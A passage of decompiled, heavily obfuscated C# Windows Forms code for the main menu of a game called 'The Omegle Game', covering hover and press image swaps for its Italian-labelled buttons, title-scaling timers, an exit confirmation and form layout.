				reference5 = (float)((double)reference5 + 0.3);
				num = (int)((num2 * 1213994) ^ 0x7848DE70);
				continue;
			}
			case 37u:
			{
				ref float reference4 = ref float_0;
				reference4 = (float)((double)reference4 + 0.3);
				num = ((int)num2 * -2012871701) ^ 0x4B07D726;
				continue;
			}
			case 36u:
				num = ((int)num2 * -419346191) ^ 0x77AD121C;
				continue;
			case 35u:
			{
				int num7;
				int num8;
				if (!flag3)
				{
					num7 = -825582450;
					num8 = -825582450;
				}
				else
				{
					num7 = -23170976;
					num8 = -23170976;
				}
				num = num7 ^ (int)(num2 * 2130704092);
				continue;
			}
			case 34u:
				num = ((int)num2 * -2098693157) ^ 0xD0A842A;
				continue;
			case 32u:
				GForm1.smethod_16((Control)(object)PictureBox_0, (Image)(object)smethod_0(GForm1.smethod_17((Control)(object)PictureBox_0), float_0));
				num = ((int)num2 * -1319398239) ^ -1925037827;
				continue;
			case 31u:
			{
				ref float reference3 = ref float_0;
				reference3 = (float)((double)reference3 + 0.3);
				num = ((int)num2 * -1817681824) ^ -880533593;
				continue;
			}
			case 30u:
				num = ((int)num2 * -1793377994) ^ -200615770;
				continue;
			case 29u:
				GForm1.smethod_16((Control)(object)PictureBox_2, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello.png")));
				GForm1.smethod_16((Control)(object)PictureBox_3, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni.png")));
				num = (int)(num2 * 1146950351) ^ -1361459386;
				continue;
			case 28u:
				num = -464594266;
				continue;
			case 27u:
				checked
				{
					int_0++;
					num = -691081930;
					continue;
				}
			case 26u:
				break;
			case 25u:
				num = -1606790509;
				continue;
			case 24u:
				goto IL_03d6;
			case 23u:
				goto IL_03fd;
			case 22u:
				checked
				{
					int_1++;
					int_0 = 0;
				}
				num = ((int)num2 * -730134403) ^ 0xD929E93;
				continue;
			case 21u:
				GForm1.smethod_32(Timer_0, 50);
				num = ((int)num2 * -1018218119) ^ -974588115;
				continue;
			case 20u:
				GForm1.smethod_20((object)int_0);
				num = ((int)num2 * -2077303131) ^ -35855758;
				continue;
			case 19u:
				GForm1.smethod_20((object)Timer_0);
				GForm1.smethod_19();
				num = (int)(num2 * 840108010) ^ -160743763;
				continue;
			case 18u:
			{
				ref float reference2 = ref float_0;
				reference2 = (float)((double)reference2 + 0.3);
				num = ((int)num2 * -449669843) ^ -2134774175;
				continue;
			}
			case 17u:
				GForm1.smethod_16((Control)(object)PictureBox_1, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia.png")));
				num = (int)((num2 * 129057486) ^ 0x6DB35D45);
				continue;
			case 16u:
			{
				ref float reference = ref float_0;
				reference = (float)((double)reference + 0.3);
				num = ((int)num2 * -1410919767) ^ 0x41AF7937;
				continue;
			}
			case 15u:
				goto end_IL_06f4;
			case 14u:
				num = (int)((num2 * 511689058) ^ 0x4FEEC57C);
				continue;
			case 13u:
				GForm1.smethod_20((object)float_0);
				num = ((int)num2 * -668191543) ^ -1827995912;
				continue;
			case 12u:
				num = (int)((num2 * 2124820934) ^ 0x68A6F196);
				continue;
			case 11u:
				num = (int)((num2 * 316603471) ^ 0x41D4B914);
				continue;
			case 10u:
				num = (int)((num2 * 681024399) ^ 0x3E31FE4C);
				continue;
			case 9u:
				num = ((int)num2 * -50863313) ^ 0x45C1776C;
				continue;
			case 8u:
				GForm1.smethod_16((Control)(object)PictureBox_3, (Image)(object)smethod_0(GForm1.smethod_17((Control)(object)PictureBox_3), float_0));
				num = (int)((num2 * 453231452) ^ 0x7ED2DD9C);
				continue;
			case 7u:
			{
				int num3;
				int num4;
				if (!flag2)
				{
					num3 = -1306614150;
					num4 = -1306614150;
				}
				else
				{
					num3 = -820924557;
					num4 = -820924557;
				}
				num = num3 ^ ((int)num2 * -404489418);
				continue;
			}
			case 6u:
				GForm1.smethod_16((Control)(object)PictureBox_4, (Image)(object)smethod_0(GForm1.smethod_17((Control)(object)PictureBox_4), float_0));
				num = ((int)num2 * -1325644242) ^ 0x6A15C855;
				continue;
			case 5u:
				float_0 = 0.3f;
				num = (int)(num2 * 2038659545) ^ -516553748;
				continue;
			case 4u:
				GForm1.smethod_31(Timer_0);
				int_0 = 0;
				num = ((int)num2 * -479129123) ^ -1340546896;
				continue;
			case 3u:
				flag = int_1 == 0;
				num = ((int)num2 * -1055424173) ^ -1874386719;
				continue;
			case 2u:
				num = -1902907454;
				continue;
			case 1u:
				num = (int)(num2 * 1500987004) ^ -1310411507;
				continue;
			case 0u:
				GForm1.smethod_16((Control)(object)PictureBox_4, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci.png")));
				num = ((int)num2 * -2145762260) ^ 0x18AFC8CB;
				continue;
			default:
				return;
			case 33u:
				goto IL_07e3;
			case 54u:
				return;
			}
			int num11;
			if (int_1 != 2)
			{
				num = -716648487;
				num11 = -716648487;
			}
			else
			{
				num = -1977001609;
				num11 = -1977001609;
			}
			continue;
			IL_03fd:
			int num12;
			if (int_1 == 1)
			{
				num = -1418438723;
				num12 = -1418438723;
			}
			else
			{
				num = -605059024;
				num12 = -605059024;
			}
			continue;
			IL_03d6:
			int num13;
			if (int_1 == 3)
			{
				num = -1383251748;
				num13 = -1383251748;
			}
			else
			{
				num = -1563651126;
				num13 = -1563651126;
			}
			continue;
			end_IL_06f4:
			break;
		}
		goto IL_0539;
		IL_0539:
		num = -1685384417;
		goto IL_06f4;
	}

	private void method_2(object sender, EventArgs e)
	{
		bool flag = bool_0;
		while (true)
		{
			int num = -250546046;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF2528F33u) % 7u)
				{
				case 6u:
					num = ((int)num2 * -1052896291) ^ -64121913;
					continue;
				case 5u:
					num = -1036945109;
					continue;
				case 4u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -1610476488;
						num4 = -1610476488;
					}
					else
					{
						num3 = -1247337712;
						num4 = -1247337712;
					}
					num = num3 ^ ((int)num2 * -1885762674);
					continue;
				}
				case 3u:
					num = ((int)num2 * -685661725) ^ -528596146;
					continue;
				case 0u:
					GForm1.smethod_16((Control)(object)PictureBox_1, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia_hover.png")));
					num = ((int)num2 * -1977486574) ^ 0x116E7AB5;
					continue;
				default:
					return;
				case 2u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	private void method_3(object sender, EventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -665571767;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x82C659E5u) % 7u)
				{
				case 6u:
					num = ((int)num2 * -1722833823) ^ 0x37FBADC5;
					continue;
				case 5u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -891548644;
						num4 = -891548644;
					}
					else
					{
						num3 = -2024738403;
						num4 = -2024738403;
					}
					num = num3 ^ ((int)num2 * -2065846536);
					continue;
				}
				case 4u:
					GForm1.smethod_16((Control)(object)PictureBox_1, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia.png")));
					num = ((int)num2 * -620192584) ^ -282575526;
					continue;
				case 1u:
					flag = bool_0;
					num = (int)((num2 * 583407024) ^ 0x34E20A44);
					continue;
				case 0u:
					num = (int)((num2 * 926015647) ^ 0x593EAD05);
					continue;
				default:
					return;
				case 2u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private void method_4(object sender, MouseEventArgs e)
	{
		bool flag = bool_0;
		while (true)
		{
			int num = -1810192768;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8D96B7ABu) % 10u)
				{
				case 9u:
					num = -46818822;
					continue;
				case 8u:
					GForm1.smethod_16((Control)(object)PictureBox_1, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\storia_pressed.png")));
					num = (int)(num2 * 1008884474) ^ -854730834;
					continue;
				case 6u:
					GClass1.smethod_1().method_4();
					num = (int)(num2 * 1774015539) ^ -1489926129;
					continue;
				case 5u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = 1835604759;
						num4 = 1835604759;
					}
					else
					{
						num3 = 622842026;
						num4 = 622842026;
					}
					num = num3 ^ ((int)num2 * -1140138135);
					continue;
				}
				case 4u:
					bool_1 = true;
					num = ((int)num2 * -1661241830) ^ -295028554;
					continue;
				case 3u:
					GClass1.smethod_1().method_3();
					num = (int)((num2 * 16078975) ^ 0x7E87A974);
					continue;
				case 1u:
					GForm1.smethod_33((Control)(object)Class2.Class3_0.GForm3_0);
					GForm1.smethod_34((Form)(object)this);
					num = ((int)num2 * -1136722475) ^ 0x35609C84;
					continue;
				case 0u:
					num = (int)(num2 * 905643347) ^ -1380657322;
					continue;
				default:
					return;
				case 2u:
					break;
				case 7u:
					return;
				}
				break;
			}
		}
	}

	private void method_5(object sender, EventArgs e)
	{
		bool flag = bool_0;
		while (true)
		{
			int num = -2077870163;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xF7B41226u) % 6u)
				{
				case 5u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = -794030555;
						num4 = -794030555;
					}
					else
					{
						num3 = -686950806;
						num4 = -686950806;
					}
					num = num3 ^ ((int)num2 * -196477469);
					continue;
				}
				case 3u:
					num = (int)(num2 * 1903647759) ^ -1712816726;
					continue;
				case 1u:
					num = -1055386540;
					continue;
				case 0u:
					GForm1.smethod_16((Control)(object)PictureBox_2, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello_hover.png")));
					num = (int)(num2 * 1808873859) ^ -1476515697;
					continue;
				default:
					return;
				case 2u:
					break;
				case 4u:
					return;
				}
				break;
			}
		}
	}

	private void method_6(object sender, EventArgs e)
	{
		if (!bool_0)
		{
			return;
		}
		while (true)
		{
			int num = -2097773800;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x8148DCBFu) % 4u)
				{
				case 3u:
					GForm1.smethod_16((Control)(object)PictureBox_2, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello.png")));
					num = (int)((num2 * 344141982) ^ 0x20DFDA21);
					continue;
				case 0u:
					num = ((int)num2 * -731205477) ^ 0x42E9126A;
					continue;
				default:
					return;
				case 2u:
					break;
				case 1u:
					return;
				}
				break;
			}
		}
	}

	private void method_7(object sender, MouseEventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = -591779618;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xD47FE97Fu) % 8u)
				{
				case 7u:
					num = -2000427435;
					continue;
				case 6u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = -944062406;
						num4 = -944062406;
					}
					else
					{
						num3 = -791940344;
						num4 = -791940344;
					}
					num = num3 ^ (int)(num2 * 884443620);
					continue;
				}
				case 5u:
					GForm1.smethod_16((Control)(object)PictureBox_2, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\duello_pressed.png")));
					num = (int)(num2 * 1072730874) ^ -293314559;
					continue;
				case 4u:
					bool_1 = true;
					num = (int)(num2 * 1955272944) ^ -1434679825;
					continue;
				case 1u:
					flag = bool_0;
					num = ((int)num2 * -905047992) ^ -1123615567;
					continue;
				case 0u:
					GForm1.smethod_33((Control)(object)Class2.Class3_0.GForm2_0);
					GForm1.smethod_34((Form)(object)this);
					num = (int)((num2 * 1213667501) ^ 0x442AC3C0);
					continue;
				default:
					return;
				case 3u:
					break;
				case 2u:
					return;
				}
				break;
			}
		}
	}

	private void method_8(object sender, EventArgs e)
	{
		while (true)
		{
			int num = 141474048;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x2183FE98u) % 5u)
				{
				case 4u:
					GForm1.smethod_16((Control)(object)PictureBox_3, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni_hover.png")));
					num = ((int)num2 * -1827265032) ^ 0x568F6F8A;
					continue;
				case 2u:
					num = (int)((num2 * 1772272227) ^ 0x60334847);
					continue;
				case 1u:
				{
					int num3;
					int num4;
					if (!bool_0)
					{
						num3 = -260530727;
						num4 = -260530727;
					}
					else
					{
						num3 = -1513666601;
						num4 = -1513666601;
					}
					num = num3 ^ (int)(num2 * 1769101190);
					continue;
				}
				default:
					return;
				case 3u:
					break;
				case 0u:
					return;
				}
				break;
			}
		}
	}

	private void method_9(object sender, EventArgs e)
	{
		while (true)
		{
			int num = 1705793341;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x188C7C55u) % 5u)
				{
				case 4u:
				{
					int num3;
					int num4;
					if (!bool_0)
					{
						num3 = 1222697300;
						num4 = 1222697300;
					}
					else
					{
						num3 = 1343431601;
						num4 = 1343431601;
					}
					num = num3 ^ (int)(num2 * 919766794);
					continue;
				}
				case 2u:
					num = (int)((num2 * 1574440458) ^ 0x387C7E60);
					continue;
				case 1u:
					GForm1.smethod_16((Control)(object)PictureBox_3, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni.png")));
					num = ((int)num2 * -1584674074) ^ 0x4C311D87;
					continue;
				default:
					return;
				case 0u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private void method_10(object sender, MouseEventArgs e)
	{
		bool flag = default(bool);
		while (true)
		{
			int num = 1547121062;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x78A7B30Au) % 7u)
				{
				case 6u:
					GForm1.smethod_16((Control)(object)PictureBox_3, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\opzioni_pressed.png")));
					num = (int)(num2 * 1317512398) ^ -517793458;
					continue;
				case 5u:
				{
					int num3;
					int num4;
					if (flag)
					{
						num3 = 412122617;
						num4 = 412122617;
					}
					else
					{
						num3 = 1801378957;
						num4 = 1801378957;
					}
					num = num3 ^ (int)(num2 * 1636662696);
					continue;
				}
				case 4u:
					num = (int)((num2 * 836423120) ^ 0x78240395);
					continue;
				case 2u:
					num = (int)((num2 * 1047999176) ^ 0x271F91DC);
					continue;
				case 1u:
					flag = bool_0;
					num = ((int)num2 * -1950618419) ^ 0x39436655;
					continue;
				default:
					return;
				case 0u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private void method_11(object sender, EventArgs e)
	{
		if (!bool_0)
		{
			return;
		}
		while (true)
		{
			int num = -774469744;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x865CA97Au) % 3u)
				{
				case 1u:
					goto IL_000a;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_000a:
				GForm1.smethod_16((Control)(object)PictureBox_4, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci_hover.png")));
				num = (int)((num2 * 549421387) ^ 0x7575459A);
			}
		}
	}

	private void method_12(object sender, EventArgs e)
	{
		bool flag = bool_0;
		while (true)
		{
			int num = -820592098;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x88EA046Fu) % 5u)
				{
				case 4u:
				{
					int num3;
					int num4;
					if (!flag)
					{
						num3 = -105769892;
						num4 = -105769892;
					}
					else
					{
						num3 = -1377596459;
						num4 = -1377596459;
					}
					num = num3 ^ ((int)num2 * -444575883);
					continue;
				}
				case 2u:
					GForm1.smethod_16((Control)(object)PictureBox_4, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci.png")));
					num = (int)(num2 * 379195880) ^ -595454946;
					continue;
				case 1u:
					num = ((int)num2 * -1827434828) ^ 0x66F4672D;
					continue;
				default:
					return;
				case 0u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	private void method_13(object sender, MouseEventArgs e)
	{
		while (true)
		{
			int num = -24770233;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xB783EACBu) % 7u)
				{
				case 6u:
					num = (int)(num2 * 1455254679) ^ -1319658848;
					continue;
				case 5u:
					method_14();
					num = ((int)num2 * -1346726527) ^ -1992484789;
					continue;
				case 4u:
				{
					int num3;
					int num4;
					if (!bool_0)
					{
						num3 = -1655704973;
						num4 = -1655704973;
					}
					else
					{
						num3 = -389975679;
						num4 = -389975679;
					}
					num = num3 ^ (int)(num2 * 968050542);
					continue;
				}
				case 1u:
					num = (int)((num2 * 346481321) ^ 0x67C3A501);
					continue;
				case 0u:
					GForm1.smethod_16((Control)(object)PictureBox_4, GForm1.smethod_15(GForm1.smethod_14(GForm1.smethod_13(), "\\data\\Images\\esci_pressed.png")));
					num = (int)(num2 * 244164193) ^ -1047485578;
					continue;
				default:
					return;
				case 2u:
					break;
				case 3u:
					return;
				}
				break;
			}
		}
	}

	public void method_14()
	{
		//IL_00e8: Unknown result type (might be due to invalid IL or missing references)
		//IL_00ee: Invalid comparison between Unknown and I4
		bool flag = !bool_1;
		bool flag2 = default(bool);
		while (true)
		{
			int num = 1468806455;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x624C52F2u) % 23u)
				{
				case 22u:
					num = (int)(num2 * 1851232163) ^ -7304631;
					continue;
				case 21u:
					GForm1.smethod_20((object)Timer_1);
					num = (int)(num2 * 1306800539) ^ -876181053;
					continue;
				case 19u:
					num = ((int)num2 * -1527065741) ^ -519885917;
					continue;
				case 18u:
					GForm1.smethod_19();
					num = ((int)num2 * -2074728099) ^ 0x7E0B35B5;
					continue;
				case 17u:
					GForm1.smethod_31(Timer_1);
					num = ((int)num2 * -1261961837) ^ 0x4234DD22;
					continue;
				case 16u:
					num = ((int)num2 * -1029541007) ^ 0x75957F0;
					continue;
				case 15u:
					num = (int)(num2 * 1181132827) ^ -182734697;
					continue;
				case 14u:
					GForm1.smethod_19();
					GForm1.smethod_36(GForm1.smethod_11());
					num = (int)(num2 * 1853435734) ^ -332919860;
					continue;
				case 13u:
					num = ((int)num2 * -215855601) ^ 0x219B2097;
					continue;
				case 12u:
					flag2 = (int)GForm1.smethod_35("Sei sicuro di voler uscire dal gioco?", "The Omegle Game", (MessageBoxButtons)4, (MessageBoxIcon)32) == 6;
					num = ((int)num2 * -1789107631) ^ 0x693BBA34;
					continue;
				case 11u:
					num = 1643076967;
					continue;
				case 10u:
					GForm1.smethod_20((object)bool_0);
					num = (int)(num2 * 1938207229) ^ -1558049038;
					continue;
				case 9u:
					GForm1.smethod_31(Timer_1);
					GForm1.smethod_20((object)Timer_1);
					GForm1.smethod_20((object)bool_0);
					num = (int)(num2 * 1361394881) ^ -245309665;
					continue;
				case 8u:
				{
					int num5;
					int num6;
					if (!flag)
					{
						num5 = -295974397;
						num6 = -295974397;
					}
					else
					{
						num5 = -689830451;
						num6 = -689830451;
					}
					num = num5 ^ ((int)num2 * -1991718061);
					continue;
				}
				case 6u:
					num = ((int)num2 * -2082582828) ^ 0x709DFFA3;
					continue;
				case 5u:
				{
					int num3;
					int num4;
					if (flag2)
					{
						num3 = 182141239;
						num4 = 182141239;
					}
					else
					{
						num3 = 324980221;
						num4 = 324980221;
					}
					num = num3 ^ (int)(num2 * 1061142393);
					continue;
				}
				case 4u:
					GForm1.smethod_20((object)bool_1);
					num = ((int)num2 * -963328918) ^ -1933843113;
					continue;
				case 3u:
					num = (int)(num2 * 1488340115) ^ -63958863;
					continue;
				case 2u:
					num = 720652472;
					continue;
				case 1u:
					num = (int)((num2 * 1190223762) ^ 0x4395D3E2);
					continue;
				case 0u:
					GForm1.smethod_20((object)bool_1);
					num = ((int)num2 * -793716360) ^ 0x6A81363B;
					continue;
				default:
					return;
				case 20u:
					break;
				case 7u:
					return;
				}
				break;
			}
		}
	}

	private void method_15(object sender, FormClosingEventArgs e)
	{
		while (true)
		{
			int num = 239844847;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x6C773282u) % 8u)
				{
				case 6u:
					GForm1.smethod_37((CancelEventArgs)(object)e, bool_3: true);
					num = (int)(num2 * 1989244981) ^ -1380120755;
					continue;
				case 5u:
					method_14();
					num = (int)(num2 * 211054811) ^ -2131909867;
					continue;
				case 3u:
					num = 1348500318;
					continue;
				case 2u:
				{
					int num3;
					int num4;
					if (!bool_1)
					{
						num3 = -74705264;
						num4 = -74705264;
					}
					else
					{
						num3 = -32418467;
						num4 = -32418467;
					}
					num = num3 ^ (int)(num2 * 1015304974);
					continue;
				}
				case 1u:
					num = (int)((num2 * 2014293590) ^ 0x61880F7);
					continue;
				case 0u:
					num = (int)(num2 * 528612718) ^ -1449406216;
					continue;
				default:
					return;
				case 7u:
					break;
				case 4u:
					return;
				}
				break;
			}
		}
	}

	private void method_16(object sender, EventArgs e)
	{
		GForm1.smethod_19();
		while (true)
		{
			int num = 1532206357;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0x315B07F4u) % 3u)
				{
				case 1u:
					goto IL_0007;
				default:
					return;
				case 2u:
					break;
				case 0u:
					return;
				}
				break;
				IL_0007:
				num = (int)(num2 * 240038686) ^ -1695574153;
			}
		}
	}

	[DebuggerNonUserCode]
	void Form.Dispose(bool disposing)
	{
		try
		{
			bool flag = default(bool);
			while (true)
			{
				int num = 1609118781;
				while (true)
				{
					uint num2;
					int num5;
					switch ((num2 = (uint)num ^ 0x991DACFu) % 8u)
					{
					case 7u:
						num = (int)(num2 * 635589789) ^ -1991657257;
						continue;
					case 4u:
						num5 = ((icontainer_0 != null) ? 1 : 0);
						goto IL_001f;
					case 3u:
						num = 48141290;
						continue;
					case 2u:
						if (disposing)
						{
							num = (int)(num2 * 1757384983) ^ -1612427219;
							continue;
						}
						num5 = 0;
						goto IL_001f;
					case 1u:
						GForm1.smethod_38((IDisposable)icontainer_0);
						num = ((int)num2 * -1277507714) ^ 0x27FF3876;
						continue;
					case 0u:
					{
						int num3;
						int num4;
						if (flag)
						{
							num3 = 1141387142;
							num4 = 1141387142;
						}
						else
						{
							num3 = 496925996;
							num4 = 496925996;
						}
						num = num3 ^ ((int)num2 * -2106826218);
						continue;
					}
					default:
						return;
					case 6u:
						break;
					case 5u:
						return;
						IL_001f:
						flag = (byte)num5 != 0;
						num = 321739103;
						continue;
					}
					break;
				}
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
			while (true)
			{
				IL_00ec:
				int num6 = 321563754;
				while (true)
				{
					uint num2;
					switch ((num2 = (uint)num6 ^ 0x991DACFu) % 3u)
					{
					case 1u:
						goto IL_00c2;
					default:
						goto end_IL_00cf;
					case 2u:
						break;
					case 0u:
						goto end_IL_00cf;
					}
					goto IL_00ec;
					IL_00c2:
					num6 = (int)((num2 * 1806325922) ^ 0x13DF6FE7);
					continue;
					end_IL_00cf:
					break;
				}
				break;
			}
		}
	}

	[DebuggerStepThrough]
	private void method_17()
	{
		//IL_02a3: Unknown result type (might be due to invalid IL or missing references)
		while (true)
		{
			int num = -111076041;
			while (true)
			{
				uint num2;
				switch ((num2 = (uint)num ^ 0xBD88E77Bu) % 91u)
				{
				case 90u:
					GForm1.smethod_47((Control)(object)PictureBox_1, "PictureBox2");
					num = (int)((num2 * 184706076) ^ 0x4208F6CD);
					continue;
				case 89u:
					GForm1.smethod_65((ISupportInitialize)PictureBox_2);
					num = ((int)num2 * -1050975401) ^ 0x60403D3C;
					continue;
				case 88u:
					GForm1.smethod_46((Control)(object)PictureBox_4, new Point(396, 408));
					num = (int)((num2 * 327882486) ^ 0x3751C7F2);
					continue;
				case 87u:
					PictureBox_4 = GForm1.smethod_40();
					Timer_1 = GForm1.smethod_41(icontainer_0);
					num = (int)((num2 * 398832580) ^ 0x62FD0ADD);
					continue;
				case 86u:
					GForm1.smethod_32(Timer_1, 1000);
					num = (int)((num2 * 932076964) ^ 0x67F6B1FB);
					continue;
				case 85u:
					GForm1.smethod_32(Timer_0, 300);
					num = (int)(num2 * 520738749) ^ -409767588;
					continue;
				case 84u:
					GForm1.smethod_46((Control)(object)PictureBox_2, new Point(336, 278));
					GForm1.smethod_47((Control)(object)PictureBox_2, "PictureBox3");
					num = (int)(num2 * 1136308797) ^ -425034553;
					continue;
				case 83u:
					GForm1.smethod_49(PictureBox_1, 1);
					num = (int)((num2 * 131303106) ^ 0x69996F67);
					continue;
				case 82u:
					GForm1.smethod_59((Form)(object)this, (FormBorderStyle)1);
					num = ((int)num2 * -686853103) ^ -1808910010;
					continue;
				case 81u:
					GForm1.smethod_65((ISupportInitialize)PictureBox_4);
					num = (int)((num2 * 179250416) ^ 0x32ECB674);
					continue;
				case 80u:
					GForm1.smethod_62((Control)(object)this, "MainForm");
					num = ((int)num2 * -831865803) ^ -716981835;
					continue;
				case 79u:
					num = ((int)num2 * -282803160) ^ -1063598062;
					continue;
				case 78u:
					num = ((int)num2 * -140330233) ^ -1547204864;
					continue;
				case 77u:
					icontainer_0 = GForm1.smethod_39();
					num = (int)(num2 * 507239979) ^ -2053052377;
					continue;
				case 76u:
					GForm1.smethod_48((Control)(object)PictureBox_4, new Size(213, 59));
					GForm1.smethod_49(PictureBox_4, 4);
					GForm1.smethod_50(PictureBox_4, bool_3: false);
					num = ((int)num2 * -1679765606) ^ -623949496;
					continue;
				case 75u:
					num = ((int)num2 * -1604623638) ^ 0x4A89A373;
					continue;
				case 74u:
					GForm1.smethod_46((Control)(object)PictureBox_0, new Point(214, 12));
					num = (int)((num2 * 1348864380) ^ 0x7BB19CE3);
					continue;
				case 73u:
					GForm1.smethod_61((Form)(object)this, bool_3: false);
					num = ((int)num2 * -513178370) ^ 0x2ADF23C8;
					continue;
				case 72u:
					GForm1.smethod_48((Control)(object)PictureBox_0, new Size(617, 69));
					num = ((int)num2 * -915549221) ^ -1053112719;
					continue;
				case 71u:
					num = (int)((num2 * 1616366314) ^ 0x5A01ABB3);
					continue;
				case 70u:
					GForm1.smethod_60((Form)(object)this, new Padding(4));
					num = ((int)num2 * -1430272891) ^ 0xCF16CC2;
					continue;
				case 69u:
					GForm1.smethod_56(GForm1.smethod_55((Control)(object)this), (Control)(object)PictureBox_3);
					GForm1.smethod_56(GForm1.smethod_55((Control)(object)this), (Control)(object)PictureBox_2);
					GForm1.smethod_56(GForm1.smethod_55((Control)(object)this), (Control)(object)PictureBox_1);
					num = ((int)num2 * -820491339) ^ -632937549;
					continue;
				case 68u:
					GForm1.smethod_65((ISupportInitialize)PictureBox_1);
					num = (int)(num2 * 554629334) ^ -2085259154;
					continue;
				case 67u:
					num = (int)((num2 * 2023105096) ^ 0x36EEBF8F);
					continue;
				case 66u:
					GForm1.smethod_64((Form)(object)this, "The Omegle Game");
					num = (int)((num2 * 890285615) ^ 0x49AF4D18);
					continue;
				case 65u:
					num = (int)((num2 * 774116843) ^ 0x5AE1382B);
					continue;
				case 64u:
					GForm1.smethod_44((Control)(object)PictureBox_2, Color.Transparent);
					num = (int)(num2 * 430020663) ^ -686231119;
					continue;
				case 63u:
					GForm1.smethod_47((Control)(object)PictureBox_0, "PictureBox1");
					num = (int)(num2 * 923988174) ^ -896049513;
					continue;
				case 62u:
					GForm1.smethod_42((ISupportInitialize)PictureBox_1);
					num = ((int)num2 * -641010457) ^ 0xF3E32E3;
					continue;
				case 61u:
					GForm1.smethod_45((Control)(object)PictureBox_0, (ImageLayout)3);
					num = (int)((num2 * 954786656) ^ 0x55C699E2);
					continue;
				case 60u:
					GForm1.smethod_54((Form)(object)this, new Size(1025, 638));
					num = (int)(num2 * 2113287270) ^ -98047909;
					continue;
				case 59u:
					GForm1.smethod_63((Form)(object)this, (FormStartPosition)1);
					num = ((int)num2 * -424346929) ^ 0x1D24422A;
					continue;
				case 58u:
					GForm1.smethod_42((ISupportInitialize)PictureBox_2);
					num = (int)((num2 * 260310429) ^ 0x69B388DC);
					continue;
				case 57u:
					PictureBox_1 = GForm1.smethod_40();
					num = ((int)num2 * -1787227893) ^ 0x6BC0E3A1;
					continue;
				case 56u:
					PictureBox_2 = GForm1.smethod_40();
					num = (int)((num2 * 174896092) ^ 0x524AA56F);
					continue;
				case 55u:
					num = (int)(num2 * 421232836) ^ -1405360287;
					continue;
				case 54u:
					GForm1.smethod_56(GForm1.smethod_55((Control)(object)this), (Control)(object)PictureBox_0);
					num = ((int)num2 * -411663217) ^ -1803473223;
					continue;
				case 53u:
					GForm1.smethod_42((ISupportInitialize)PictureBox_0);
					num = ((int)num2 * -1904684822) ^ 0x3F80914D;
					continue;
				case 52u:
					((Control)this).set_DoubleBuffered(true);
					num = ((int)num2 * -1824016112) ^ -61823398;
					continue;
				case 51u:
					GForm1.smethod_50(PictureBox_3, bool_3: false);
					num = (int)((num2 * 1479500815) ^ 0x5830B8FC);
					continue;
				case 50u:
					num = ((int)num2 * -2115997572) ^ 0x8AAD575;
					continue;
				case 49u:
					num = (int)(num2 * 89034307) ^ -1074420443;
					continue;
				case 48u:
					GForm1.smethod_49(PictureBox_3, 3);
					num = (int)(num2 * 1681156759) ^ -878711038;
					continue;
				case 47u:
					num = ((int)num2 * -271090720) ^ -1887882098;
					continue;
				case 46u:
					num = (int)(num2 * 1268060084) ^ -567863074;
					continue;
				case 45u:
					PictureBox_3 = GForm1.smethod_40();
					num = (int)(num2 * 422731682) ^ -1417280649;
					continue;
				case 44u:
					num = (int)(num2 * 1622655651) ^ -904417411;
					continue;
				case 43u:
					GForm1.smethod_51((ContainerControl)(object)this, new SizeF(10f, 22f));
					GForm1.smethod_52((ContainerControl)(object)this, (AutoScaleMode)1);
					num = (int)((num2 * 1827292100) ^ 0x2507FB4E);
					continue;
				case 42u:
					GForm1.smethod_56(GForm1.smethod_55((Control)(object)this), (Control)(object)PictureBox_4);
